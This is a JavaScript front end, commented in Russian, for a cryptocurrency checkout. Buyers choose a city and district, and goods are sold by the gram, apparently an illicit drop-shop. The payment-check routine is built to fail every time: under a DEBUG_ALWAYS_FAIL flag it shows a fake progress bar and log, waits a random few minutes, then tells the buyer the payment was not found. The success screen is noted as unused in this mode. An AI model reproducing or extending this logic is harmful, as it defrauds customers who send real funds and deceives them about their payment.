// 🔥 КРИПТОПЛАТЕЖИ
function selectCurrency(cur) {
    selectedCurrency = cur;
    document.querySelectorAll('.currency-card').forEach(card => card.classList.remove('selected'));
    event.target.classList.add('selected');
    updateNetworkButtons(cur);
    updatePaymentSummary();
}

function selectNetwork(network) {
    selectedNetwork = network;
    document.querySelectorAll('.network-btn').forEach(btn => btn.classList.remove('active'));
    event.target.classList.add('active');
    updatePaymentSummary();
}

function updateNetworkButtons(currency) {
    const networkButtons = document.getElementById('networkButtons');
    networkButtons.innerHTML = '';
    
    const networks = networkConfigs[currency];
    if (networks) {
        Object.keys(networks).forEach(network => {
            const btn = document.createElement('button');
            btn.className = 'network-btn';
            btn.textContent = network;
            btn.onclick = () => selectNetwork(network);
            networkButtons.appendChild(btn);
        });
        
        if (Object.keys(networks).length > 0) {
            selectedNetwork = Object.keys(networks)[0];
            networkButtons.firstChild.classList.add('active');
        }
    }
    updatePaymentSummary();
}

function updatePaymentSummary() {
    if (!selectedCurrency || !selectedNetwork) return;
    
    const totalGBP = cart.reduce((s,i)=>s + i.priceGBP * i.count,0);
    const rate = currencies[selectedCurrency] || 1;
    const converted = totalGBP * rate;
    const config = networkConfigs[selectedCurrency][selectedNetwork];
    
    const summary = `${converted.toFixed(6)} ${selectedCurrency} (${totalGBP.toFixed(2)} ₽)`;
    document.getElementById('paySummary').textContent = summary;
    document.getElementById('walletAddr').textContent = config.address;
    
    const lastUpdate = localStorage.getItem('lastRateUpdate');
    if (lastUpdate) {
        const updateTime = new Date(parseInt(lastUpdate)).toLocaleTimeString();
        const rateInfo = document.getElementById('rateInfo') || document.createElement('div');
        rateInfo.id = 'rateInfo';
        rateInfo.className = 'text-muted text-center';
        rateInfo.style.fontSize = '12px';
        rateInfo.style.marginTop = '8px';
        rateInfo.textContent = `Курс обновлен: ${updateTime}`;
        
        const paySummary = document.getElementById('paySummary');
        if (!paySummary.parentNode.querySelector('#rateInfo')) {
            paySummary.parentNode.appendChild(rateInfo);
        }
    }
}

// 🔥 ФУНКЦИИ МОДАЛЬНОГО ОКНА ОПЛАТЫ
function openPayModal() {
    if (cart.length === 0) { 
        alert('Корзина пуста'); 
        return; 
    }
    if (!selectedCity || !selectedDistrict) { 
        alert('Сначала выберите город и район'); 
        return; 
    }
    
    const currencyListEl = document.getElementById('currencyList');
    currencyListEl.innerHTML = '';
    
    Object.keys(currencies).forEach(c => {
        const cc = document.createElement('div'); 
        cc.className = 'currency-card'; 
        cc.textContent = c;
        cc.onclick = (e) => selectCurrency(c, e);
        currencyListEl.appendChild(cc);
    });
    
    selectedCurrency = null;
    selectedNetwork = null;
    
    document.getElementById('payModal').style.display = 'block';
    
    if (Object.keys(currencies).length > 0) {
        selectedCurrency = Object.keys(currencies)[0];
        updateNetworkButtons(selectedCurrency);
        currencyListEl.firstChild.classList.add('selected');
    }
    
    updateExchangeRates();
}

function closePayModal() { 
    document.getElementById('payModal').style.display = 'none'; 
}

function copyWallet(){
    const addr = document.getElementById('walletAddr').textContent;
    if (!addr) return;
    navigator.clipboard?.writeText(addr).then(()=>{ 
        alert('Адрес скопирован в буфер') 
    }).catch(()=>{ 
        alert('Не удалось скопировать, скопируйте вручную') 
    });
}

// 🔥 РУЧНЫЙ ПЕРЕВОД - ПЕРЕХОД НА ПРОВЕРКУ ПЛАТЕЖА
function payConfirmManual() {
    if (!selectedCurrency || !selectedNetwork) {
        alert('Сначала выберите валюту и сеть');
        return;
    }

    currentPaymentData = {
        city: selectedCity,
        district: selectedDistrict,
        currency: selectedCurrency,
        network: selectedNetwork,
        totalGBP: cart.reduce((s,i)=>s + i.priceGBP * i.count,0).toFixed(2),
        totalConverted: (cart.reduce((s,i)=>s + i.priceGBP * i.count,0) * currencies[selectedCurrency]).toFixed(6),
        wallet: networkConfigs[selectedCurrency][selectedNetwork].address,
        items: cart.map(item => ({
            product: item.product,
            color: item.color,
            qty: item.qty,
            priceGBP: item.priceGBP,
            count: item.count
        })),
        timestamp: new Date().toISOString(),
        debugStartTime: Date.now(),
        debugFailTime: null
    };

    addLog('💳 Проверка платежа начата...', 'info');
    
    closePayModal();
    openPage('page-payment-check');
    startPaymentChecking();
}

// 🔥 КОНФЕТТИ АНИМАЦИЯ
function createConfetti() {
    const colors = ['#6366f1', '#8b5cf6', '#f59e0b', '#10b981', '#ef4444'];
    for (let i = 0; i < 50; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + 'vw';
        confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDelay = Math.random() * 2 + 's';
        document.body.appendChild(confetti);
        
        setTimeout(() => {
            confetti.remove();
        }, 5000);
    }
}

// 🔥 УПРОЩЕННЫЕ ФУНКЦИИ ДЛЯ ЛОГИРОВАНИЯ
function addLog(message, type = 'info') {
    const logsContainer = document.getElementById('liveLogs');
    const time = new Date().toLocaleTimeString();
    
    const logEntry = document.createElement('div');
    logEntry.className = 'log-entry';
    logEntry.innerHTML = `
        <span class="log-time">${time}</span>
        <span class="log-${type}">${message}</span>
    `;
    
    logsContainer.appendChild(logEntry);
    const logEntries = logsContainer.querySelectorAll('.log-entry');
    if (logEntries.length > 3) {
        logEntries[0].remove();
    }
    
    logsContainer.scrollTop = logsContainer.scrollHeight;
}

function clearLogs() {
    document.getElementById('liveLogs').innerHTML = `
        <div class="log-entry">
            <span class="log-time" id="currentTime"></span>
            <span class="log-info">🚀 Проверка платежа начата</span>
        </div>
    `;
}

// 🔥 ПРОВЕРКА ПЛАТЕЖА С ОБЯЗАТЕЛЬНОЙ ОШИБКОЙ
async function startPaymentChecking() {
    if (!currentPaymentData) return;
    
    const progressFill = document.getElementById('progressFill');
    const statusMessage = document.getElementById('paymentStatusMessage');
    
    clearLogs();
    
    let checkCount = 0;
    const maxChecks = 8;
    
    if (paymentCheckInterval) {
        clearInterval(paymentCheckInterval);
    }
    
    // Генерируем случайное время ошибки от 2 до 10 минут
    const failTimeMinutes = DEBUG_FAIL_MINUTES_MIN + Math.random() * (DEBUG_FAIL_MINUTES_MAX - DEBUG_FAIL_MINUTES_MIN);
    const failTimeMs = failTimeMinutes * 60 * 1000;
    
    currentPaymentData.debugFailTime = Date.now() + failTimeMs;
    
    addLog(`⏳ Ожидание платежа...`, 'info');
    addLog(`⏱ Время проверки: ~${Math.round(failTimeMinutes)} мин`, 'info');
    
    paymentCheckInterval = setInterval(() => {
        checkCount++;
        
        const progress = Math.min((checkCount / maxChecks) * 100, 90);
        progressFill.style.width = progress + '%';
        
        statusMessage.innerHTML = `🔍 Проверяем платеж... (${checkCount}/${maxChecks})`;
        
        const timePassed = Date.now() - currentPaymentData.debugStartTime;
        const timeLeft = Math.max(0, currentPaymentData.debugFailTime - Date.now());
        const minutesLeft = Math.ceil(timeLeft / (60 * 1000));
        
        if (DEBUG_ALWAYS_FAIL) {
            if (timeLeft <= 0) {
                // Время вышло - показываем ошибку
                clearInterval(paymentCheckInterval);
                progressFill.style.width = '100%';
                statusMessage.innerHTML = '❌ Платеж не найден';
                addLog('❌ Платеж не обнаружен', 'error');
                addLog('⏰ Время проверки истекло', 'warning');
                
                setTimeout(() => {
                    if (confirm('Платеж не найден в блокчейне.\n\nПроверьте, что:\n1. Отправили точную сумму\n2. Использовали правильный адрес\n3. Подождите время подтверждения\n\nПроверить снова?')) {
                        checkPaymentStatus();
                    }
                }, 1000);
                return;
            }
            
            // Обновляем статус
            if (checkCount % 2 === 0) {
                addLog(`⏳ Ожидание... осталось ~${minutesLeft} мин`, 'info');
            }
            
            if (checkCount >= maxChecks) {
                clearInterval(paymentCheckInterval);
                statusMessage.innerHTML = '⏰ Проверка завершена';
                addLog('⏰ Проверка завершена', 'warning');
                
                setTimeout(() => {
                    if (confirm('Платеж не обнаружен. Проверить снова?')) {
                        checkPaymentStatus();
                    }
                }, 1000);
            }
        }
        
    }, 30000);
}

// 🔥 РУЧНАЯ ПРОВЕРКА СТАТУСА
async function checkPaymentStatus() {
    addLog(`🔄 Ручная проверка...`, 'info');
    
    if (DEBUG_ALWAYS_FAIL) {
        const timeLeft = currentPaymentData ? Math.max(0, currentPaymentData.debugFailTime - Date.now()) : 0;
        
        if (timeLeft > 0) {
            const minutesLeft = Math.ceil(timeLeft / (60 * 1000));
            addLog(`⏳ Платеж еще проверяется`, 'info');
            alert(`Платеж проверяется. Осталось примерно ${minutesLeft} минут.`);
        } else {
            addLog('❌ Платеж не найден', 'error');
            alert('Платеж не обнаружен. Убедитесь, что вы отправили точную сумму на правильный адрес.');
        }
        return false;
    }
}

// 🔥 ПОКАЗ УСПЕШНОГО ПЛАТЕЖА (не используется в режиме отладки)
function showPaymentSuccess() {
    createConfetti();
    
    document.getElementById('orderItemsList').innerHTML = '';
    currentPaymentData.items.forEach(item => {
        const orderItem = document.createElement('div');
        orderItem.className = 'order-item';
        orderItem.innerHTML = `
            <div>
                <strong>${item.product}</strong><br>
                <small>${item.color} • ${item.qty}g × ${item.count} шт</small>
            </div>
            <div>${(item.priceGBP * item.count).toFixed(2)} ₽</div>
        `;
        document.getElementById('orderItemsList').appendChild(orderItem);
    });
    
    document.getElementById('orderTotalAmount').textContent = currentPaymentData.totalGBP + ' ₽';
    document.getElementById('deliveryCity').textContent = currentPaymentData.city + ', ' + currentPaymentData.district;
    
    openPage('page-payment-success');
    
    cart = [];
    refreshCartFloat();
    saveOrderToHistory();
}

// 🔥 СОХРАНЕНИЕ ИСТОРИИ ЗАКАЗОВ
function saveOrderToHistory() {
    const orders = JSON.parse(localStorage.getItem('orderHistory') || '[]');
    const orderData = {
        id: Date.now(),
        timestamp: new Date().toISOString(),
        items: currentPaymentData.items,
        total: currentPaymentData.totalGBP,
        currency: currentPaymentData.currency,
        amount: currentPaymentData.totalConverted,
        city: currentPaymentData.city,
        district: currentPaymentData.district,
        status: 'completed'
    };
    orders.unshift(orderData);
    localStorage.setItem('orderHistory', JSON.stringify(orders.slice(0, 50)));
}